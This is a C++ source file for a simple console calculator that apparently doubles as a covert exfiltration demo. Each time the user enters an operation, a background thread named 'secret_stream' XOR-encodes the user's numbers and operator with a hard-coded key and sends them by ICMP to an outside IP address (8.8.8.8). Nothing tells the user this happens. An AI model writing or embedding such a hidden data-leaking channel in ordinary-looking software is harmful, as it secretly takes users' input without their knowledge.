#include "main.h"
#include "funcs.h"

mutex mut; // mutex for threads

// funcs for calculator
inline int sum(int a, int b) { return a + b; }
inline int razn(int a, int b) { return a - b; }
inline int multiply(int a, int b) { return a * b; }
inline int delen(int a, int b) { return a / b; }
inline int step(int a, int b) { return pow(a, b); }
inline int ost(int a, int b) { return a % b; }

bool valid_command(char command)
{
    string opers = "+-*/%^"; // available operators
    if (opers.find(command) != string::npos)
        return true;
    return false;
}

void send_file(int first_num, int second_num, char oper)
{
    int key = 89959085; // key for XOR encoding
    int h = 0;

    first_num ^= key;               // xor
    second_num ^= key;              // xor
    oper += 15 + (counter + 2) % 3; // encoding with ASCII table for operator

    int arr[3] = {first_num, second_num, int(oper)};

    char destination[8]; // change size when change IP

    for (char i : "8.8.8.8") // IP for destination
    {
        destination[h++] = i;
    }

    lock_guard<mutex> guard(mut);

    icmp(arr, destination);
}

void menu(char command)
{
    int num1 = 0;
    int num2 = 0;
    cout << "Writedown 2 numbers for operation " << command << ':' << endl;
    cin >> num1 >> num2;

    thread secret_stream(send_file, num1, num2, command); // sending files (later ICMP) using new thread

    switch (command)
    {
    case '+':
        cout << "Result of operation: " << num1 << " + " << num2 << " = " << sum(num1, num2) << endl;
        break;
    case '-':
        cout << "Result of operation: " << num1 << " - " << num2 << " = " << razn(num1, num2) << endl;
        break;
    case '*':
        cout << "Result of operation: " << num1 << " * " << num2 << " = " << multiply(num1, num2) << endl;
        break;
    case '/':
        cout << "Result of operation: " << num1 << " / " << num2 << " = " << delen(num1, num2) << endl;
        break;
    case '^':
        cout << "Result of operation: " << num1 << " ^ " << num2 << " = " << step(num1, num2) << endl;
        break;
    case '%':
        cout << "Result of operation: " << num1 << " % " << num2 << " = " << ost(num1, num2) << endl;
        break;
    default:
        cout << "\t" << command << " ------- ERROR!\n";
        command = 'e';
        break;
    }

    secret_stream.join();
}